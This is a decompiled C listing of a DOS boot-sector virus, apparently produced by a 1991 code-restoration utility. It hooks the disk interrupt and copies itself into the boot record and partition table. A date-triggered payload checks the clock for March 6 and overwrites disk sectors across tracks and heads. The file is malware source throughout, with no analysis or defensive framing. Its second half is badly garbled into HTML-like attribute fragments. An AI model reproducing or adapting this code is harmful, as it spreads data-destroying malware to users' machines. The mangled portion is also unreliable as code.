﻿

/*
 ***************************************************************************
 *                                                                         *
 *    This file was prepared by EXEC-2-C code restoration utility Ver 0.1  *
 *    Copywrite (c) The Austin Code Works & Polyglot International         *
 *				Jerusalem, 1991                             *
 *                                                                         *
 ***************************************************************************
 */

#include       "EXEC-2-C.H"

Byte var1_136 [ 15 ] = {
	 80,  83,  81,  82,  30,  6,  86,  87,  14,  31, 
	 14,  7,  190,  4
	};
Byte var1_200 [ 60 ] = {
	 187,  0,  124,  139,  14,  8,  0,  131,  249,  7, 
	 117,  7,  186,  128,  0,  205,  19,  235,  43,  139, 
	 14,  8,  0,  186,  0,  1,  205,  19,  114,  32, 
	 14,  7,  184,  1,  2,  187,  0,  2,  185,  1, 
	 0,  186,  128,  0,  205,  19,  114,  14,  51,  246, 
	 252,  173,  59,  7,  117,  79,  173,  59,  71,  2
	};
char var1_23c [ 2 ] = "uI";
char var1_2be [ 40 ] = "\n"
		        "Replace and press any key when ready\r\n";
char var1_2e6 [ 15 ] = "IO      SYSMSDO";
Word var1_3be [ 417 ];


/*======== Code section prepared by EXEC-2-C code restoration utility =======*/



/****************************************************************************/
		near main()
/****************************************************************************/
{

	
	goto  label_6;
	
label_1:
	do   {
		dx = 0;
		Pushf();
		ax = 0x201;  /*PCH : RM_Table_init*/
		bx = 0x200;  /*PCH : RM_Table_init*/
		cx = 1;  /*PCH : RM_Table_init*/
		(*(FAR_FNC)0xA)();
		if(!CarryFlg)
			goto  label_2;
		ax = 0;
		Pushf();
		(*(FAR_FNC)0xA)();
	}	while(--si);
	goto  label_5;
	
label_2:
	si = 0;
	DirFlg = DOWN;
	ax = DirFlg ? *((int *)si++) : *((int *)si--);
	if(ax == *( Word *)bx)   {
		ax = DirFlg ? *((int *)si++) : *((int *)si--);
		if(ax == *( Word *)&bx[2])
			goto  label_5;
	}
	ax = 0x301;  /*PCH : RM_Table_init*/
	cl = 3;  /*PCH : RM_Table_init*/
	dh = 1;  /*PCH : RM_Table_init*/
	if(bx[0x15] != 0xFD)   
		cl = 0xE;  /*PCH : RM_Table_init*/
		*(Word * )8 = cx;
	Pushf();
	(*(FAR_FNC)0xA)();
	if(!CarryFlg)   {
		DirFlg = DOWN;
		si = 0x3BE;  /*PCH : RM_Table_init*/
		di = 0x1BE;  /*PCH : RM_Table_init*/
		cx = 0x21;  /*PCH : RM_Table_init*/
		while( cx-- )  {
			*(int *)MK_FP(es, di) = *(int *)si,
			DirFlg ? di+=2, si+=2 : di-=2, si-=2;
		};
		
		bx = 0;
		dx = 0;
		Pushf();
		ax = 0x301;  /*PCH : RM_Table_init*/
		cx = 1;  /*PCH : RM_Table_init*/
		(*(FAR_FNC)0xA)();
	}
	
label_5:
	di = pop();
	si = pop();
	es = pop();
	ds = pop();
	dx = pop();
	cx = pop();
	bx = pop();
	ax = pop();
	return;
	
label_6:
	ax = 0;
	ds = ax;
	disable();
	ss = ax;
	enable();
	push(ds);
	push(0x7C00);
	*(Word * )0x7C0A = *(Word * )0x4C;
	*(Word * )0x7C0C = *(Word * )0x4E;
	*(Word * )0x413 = *(Word * )0x411;
	ax <= 6;="" es="ax;" *(word="" *="" )0x7c05="ax;" *(word="" *="" )0x4c="0xE;" *(word="" *="" )0x4e="es;" di="0;" dirflg="DOWN;" si="0x7C00;" pch="" :="" rm_table_init*/="" cx="0x1BE;" pch="" :="" rm_table_init*/="" while(="" cx--="" )="" {="" *mk_fp(="" es="" ,="" dirflg="" di++="" :="" di--="" )="DirFlg" *si++="" :="" *si--;="" };="" goto_far="" *(dword="" *)0x7c03;="" label_7:="" cx="0;" ah="4;" pch="" :="" rm_table_init*/="" geninterrupt(0x1a);="" bios="" service="" func="" (="" ah="" )="4" */="" read="" data="" from="" real="" time="" clock="" */="" output:="" dl/dh/cl/ch-dd/mm/yy/century="" */="" cf="1" if="" no="" clock="" */="" if(dx="" !="0x306)" return;="" dx="0;" cx="1;" pch="" :="" rm_table_init*/="" label_9:="" do="" {="" si="*(Word" *="" )8;="" pch="" :="" rm_table_init*/="" ax="0x309;" pch="" :="" rm_table_init*/="" if(si="" !="3)" {="" al="0xE;" pch="" :="" rm_table_init*/="" if(si="" !="0xE)" {="" *(byte="" *)7="4;" al="0x11;" pch="" :="" rm_table_init*/="" dl="0x80;" pch="" :="" rm_table_init*/="" }="" }geninterrupt(0x13);="" bios="" service="" func="" (="" ah="" )="3" */="" write="" disk="" sectors="" */="" input:="" al-sec="" num="" ch-track="" cl-sec="" */="" dh-head="" dl-drive="" es:bx-buffer="" */="" output:="" cf-flag="" ah-stat="" al-sec="" written="" */="" if(carryflg)="" {="" ah="0;" geninterrupt(0x13);="" bios="" service="" func="" (="" ah="" )="0" */="" reset="" disk="" system="" */="" }="" ++dh;="" }="" while((unsigned)dh=""></=>< (unsigned)*(byte="" *)7);="" dh="0;" ++ch;="" goto="" label_9;="" push(bx);="" bx[si]="" &="ah;" bp[di="" +="" 0x59]="" &="dl;" push(bx);="" bx[si]="bx[si]" +="" al;="" push(bp);="" *mk_fp(="" es="" ,="" dirflg="" di++="" :="" di--)="al;" dirflg="UP;" }="">